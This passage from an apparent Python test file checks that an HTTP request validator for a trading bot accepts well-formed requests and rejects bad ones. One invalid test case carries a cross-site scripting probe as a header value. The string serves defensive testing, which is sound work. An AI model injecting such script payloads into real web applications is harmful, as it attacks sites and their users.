            return result
        
        # Test valid requests
        valid_requests = [
            {
                "method": "POST",
                "content_length": 1024,
                "headers": {
                    "content-type": "application/json",
                    "user-agent": "TradingBot/1.0",
                    "authorization": "Bearer token123"
                }
            },
            {
                "method": "GET",
                "content_length": 0,
                "headers": {
                    "user-agent": "Mozilla/5.0 (compatible; TradingBot/1.0)",
                    "accept": "application/json"
                }
            }
        ]
        
        for request in valid_requests:
            result = validate_http_request(request)
            assert result["is_valid"], f"Valid request rejected: {request}"
        
        # Test invalid requests
        invalid_requests = [
            {
                "method": "INVALID",
                "content_length": 0,
                "headers": {}
            },
            {
                "method": "POST",
                "content_length": 20 * 1024 * 1024,  # Too large
                "headers": {}
            },
            {
                "method": "GET",
                "content_length": 0,
                "headers": {
                    "x-custom": "<script>alert('xss')</script>"
                }
            }
        ]
        
        for request in invalid_requests:
            result = validate_http_request(request)
            assert not result["is_valid"], f"Invalid request accepted: {request}"
        
        print("✅ HTTP request validation passed!")


if __name__ == "__main__":
    # Run comprehensive security tests
    pytest.main([__file__, "-v", "-s"])